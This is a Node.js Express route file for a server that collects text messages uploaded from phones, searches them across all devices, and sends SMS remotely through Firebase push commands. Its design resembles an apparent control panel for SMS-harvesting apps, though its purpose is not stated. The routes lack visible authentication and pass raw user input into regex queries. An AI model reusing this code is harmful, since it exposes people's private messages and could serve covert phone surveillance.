const router = require('express').Router();
const Sms = require('../models/Sms');
const Device = require('../models/Device');
const Command = require('../models/Command');
const { sendFcm } = require('../config/firebase');

router.get('/:deviceId', async (req, res) => {
  try {
    const { page = 1, limit = 100, direction, address } = req.query;
    const query = { deviceId: req.params.deviceId };
    if (direction) query.direction = direction;
    if (address) query.address = { $regex: address, $options: 'i' };

    const [messages, total] = await Promise.all([
      Sms.find(query).sort({ timestamp: -1 }).skip((page - 1) * limit).limit(Number(limit)).lean(),
      Sms.countDocuments(query)
    ]);

    res.json({ messages, total, page: Number(page) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/upload', async (req, res) => {
  try {
    const { deviceId, messages } = req.body;
    if (!deviceId || !Array.isArray(messages)) {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    const docs = messages.map(m => ({
      deviceId,
      direction: 'incoming',
      address: m.address,
      body: m.body,
      timestamp: m.timestamp ? new Date(m.timestamp) : new Date(),
      threadId: m.threadId
    }));

    await Sms.insertMany(docs, { ordered: false }).catch(() => {});

    const io = req.app.get('io');
    if (io) io.to(`device:${deviceId}`).emit('sms_received', { deviceId, count: docs.length });

    res.json({ ok: true, saved: docs.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/send', async (req, res) => {
  try {
    const { deviceId, to, body } = req.body;
    if (!deviceId || !to || !body) return res.status(400).json({ error: 'deviceId, to, body required' });

    const device = await Device.findOne({ deviceId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    if (!device.fcmToken) return res.status(400).json({ error: 'No FCM token' });
    if (!device.firebaseSlotId) return res.status(400).json({ error: 'No Firebase slot' });

    const sms = await Sms.create({ deviceId, direction: 'outgoing', address: to, body, status: 'pending' });

    const cmd = await Command.create({
      deviceId, type: 'send_sms',
      payload: { to, body, smsId: sms._id.toString() }, sentAt: new Date()
    });

    await sendFcm(device.firebaseSlotId, device.fcmToken, {
      commandId: cmd._id.toString(), type: 'send_sms', to, body, smsId: sms._id.toString()
    });

    sms.commandId = cmd._id.toString();
    sms.status = 'sent';
    await sms.save();

    res.json({ ok: true, smsId: sms._id, commandId: cmd._id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/send-result', async (req, res) => {
  try {
    const { smsId, success } = req.body;
    await Sms.findByIdAndUpdate(smsId, { status: success ? 'sent' : 'failed' });
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/', async (req, res) => {
  try {
    const { q, page = 1, limit = 50 } = req.query;
    const query = q ? {
      $or: [
        { body: { $regex: q, $options: 'i' } },
        { address: { $regex: q, $options: 'i' } }
      ]
    } : {};

    const [messages, total] = await Promise.all([
      Sms.find(query).sort({ timestamp: -1 }).skip((page - 1) * limit).limit(Number(limit)).lean(),
      Sms.countDocuments(query)
    ]);

    res.json({ messages, total });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
